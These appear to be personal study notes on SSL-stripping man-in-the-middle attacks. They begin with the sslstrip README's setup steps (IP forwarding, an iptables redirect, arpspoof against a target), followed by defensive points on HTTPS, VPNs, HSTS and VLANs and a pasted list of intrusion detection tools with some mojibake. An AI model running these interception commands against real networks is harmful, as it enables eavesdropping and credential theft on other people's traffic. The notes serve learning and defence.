sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping 
attacks.

It requires Python 2.5 or newer, along with the 'twisted' python module.

Installing:
	* Unpack: tar zxvf sslstrip-0.5.tar.gz
	* Install twisted:  sudo apt-get install python-twisted-web
	* (Optionally) run 'python setup.py install' as root to install, 
	  or you can just run it out of the directory.  

Running:
	sslstrip can be run from the source base without installation.  
	Just run 'python sslstrip.py -h' as a non-root user to get the 
	command-line options.

	The four steps to getting this working (assuming you're running Linux) 
	are:

	1) Flip your machine into forwarding mode (as root):
	   echo "1" > /proc/sys/net/ipv4/ip_forward

	2) Setup iptables to intercept HTTP requests (as root):
	   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>
	
	3) Run sslstrip with the command-line options you'd like (see above).

	4) Run arpspoof to redirect traffic to your machine (as root):
	   arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>
	   
	   
	   
	   
	   
	   
	   always use https
	   always use encrypted tunnel
	   vpn or ssh.
	   IPSec
	   SSL / HTTPS
	   do not connect to untrusted access points.

Intrusion Detection Systems for Windows
Despite the popularity of Windows Server, the developers of intrusion detection systems donâ€™t seem to be very interested in producing software for the Windows operating system. Here are the few IDSs that run on Windows.

Host intrusion detection systems:

SolarWinds Security Event Manager
EventLog Analyzer
OSSEC
Network intrusion detection systems:

SolarWinds Security Event Manager
Snort

Intrusion Detection Systems for Mac OS
Mac owners benefit from the fact that Mac OS X and macOS are both based on Unix and so there are far more intrusion detection system options for Mac owners than those who have computers running the Windows operating system.

enable hsts strict transport security
special response header ... only accept https traffic.


so even if we try to ssl strip ... connection would get BLOCKED.

second option is to use Virtual Lans.
network isolation.
